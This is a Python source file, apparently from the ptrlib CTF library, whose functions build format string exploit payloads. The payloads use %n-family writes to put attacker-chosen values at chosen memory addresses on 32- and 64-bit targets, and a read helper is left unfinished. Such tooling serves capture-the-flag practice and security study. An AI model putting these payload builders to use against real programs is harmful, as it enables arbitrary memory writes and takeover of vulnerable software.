from ptrlib.util.encoding import *
from ptrlib.util.opebinary import *
from ptrlib.util.packing import *

def fsb_read(pos, reads, written=0, bits=32):
    # TODO
    return

def _fsb_fmtstr(pos, table, bs, written, prefix):
    payload = b''
    for addr in table:
        cnum = ((table[addr]-written-1) & ((1<<8*bs)-1)) + 1
        fmtstr = "%{}c%{}${}".format(cnum, pos, prefix)
        payload += str2bytes(fmtstr)
        written += cnum
        pos += 1
    return payload

def fsb64(pos, writes, bs=1, written=0, size=8, delta=0, endian='little'):
    assert bs in [1, 2, 4]

    prefix = {1:"hhn", 2:"hn", 4:"n"}[bs]

    # create dict to hold where/what to write
    table = {}
    for addr in writes:
        for i in range(8 // bs):
            if size // bs <= i: continue
            table[addr + i*bs] = (writes[addr]>>i*8*bs) & ((1<<8*bs)-1)

    addrList = list(table.keys())
    payload = b''

    # speculate where the address list would come
    speculated_pos = pos
    while True:
        fmtstr = _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)
        fmtstr += b'A' * (((speculated_pos-pos) * 8 - len(fmtstr)) % 8)
        if speculated_pos >= pos + len(fmtstr) // 8:
            break
        else:
            speculated_pos = pos + len(fmtstr) // 8

    # create format string
    payload += _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)

    # put padding
    payload += b'A' * (((speculated_pos-pos) * 8 - len(payload)) % 8)

    # create address list
    payload += flat(addrList, map=lambda addr:p64(addr, endian))

    return payload

def fsb32(pos, writes, bs=1, written=0, size=4, rear=False, delta=0, endian='little'):
    assert bs in [1, 2, 4]

    prefix = {1:"hhn", 2:"hn", 4:"n"}[bs]

    # create dict to hold where/what to write
    table = {}
    for addr in writes:
        for i in range(4 // bs):
            if size // bs <= i: continue
            table[addr + i*bs] = (writes[addr]>>i*8*bs) & ((1<<8*bs)-1)

    addrList = list(table.keys())

    payload = b''
    if rear: # put address list after format string
        # speculate where the address list would come
        speculated_pos = pos
        while True:
            fmtstr = _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)
            fmtstr += b'A' * (((speculated_pos-pos) * 4 - len(fmtstr)) % 4)
            if speculated_pos >= pos + len(fmtstr) // 4:
                break
            else:
                speculated_pos = pos + len(fmtstr) // 4

        # create format string
        payload += _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)

        # put padding
        payload += b'A' * (((speculated_pos-pos) * 4 - len(payload)) % 4)

        # create address list
        payload += flat(addrList, map=lambda addr: p32(addr, endian))

    else:    # put address list before format string
        # create address list
        payload += flat(addrList, map=lambda addr: p32(addr, endian))
        if b'\0' in payload:
            logger.warn("'\\x00' found in address list. Set `rear=True` to put address list after format string.")

        # create format string
        payload += _fsb_fmtstr(pos, table, bs, delta+written+len(payload), prefix)

    return payload

def fsb(pos, writes, bs=1, written=0, bits=32, size=8, rear=None, delta=0, endian='little', null=None):
    """Craft a Format String Exploit payload
    
    Args:
        pos (int)    : The position where your input appears on the stack
        writes (list): A disctionary which has the addresses as keys and the data as values
        bs (int)     : The bytes to write at once (must be 1, 2, 4)
        written (int): The byte length to be written before this payload
        bits (int)   : The address bits (32 or 64)
        size (int)   : Bytes to write
        rear (bool)  : Whether put address list after format string or before
        endian (str) : Endian ('big' or 'little')
        delta (int)  : Set this value when you somehow want to change the start number
        null (bool)  : [no longer works, for compatibility]

    Returns:
        bytes: crafted payload
    """
    if null is not None:
        raise DeprecationWarning("Deprecated keyword `null` is removed. Use `size` instead.")

    if bits == 32:
        if rear is None:
            rear = False
        return fsb32(pos, writes, bs, written, size, rear, delta, endian)
    
    elif bits == 64:
        assert rear is None or rear == True
        return fsb64(pos, writes, bs, written, size, delta, endian)
    
    else:
        raise ValueError("`bits` must be 32 or 64")
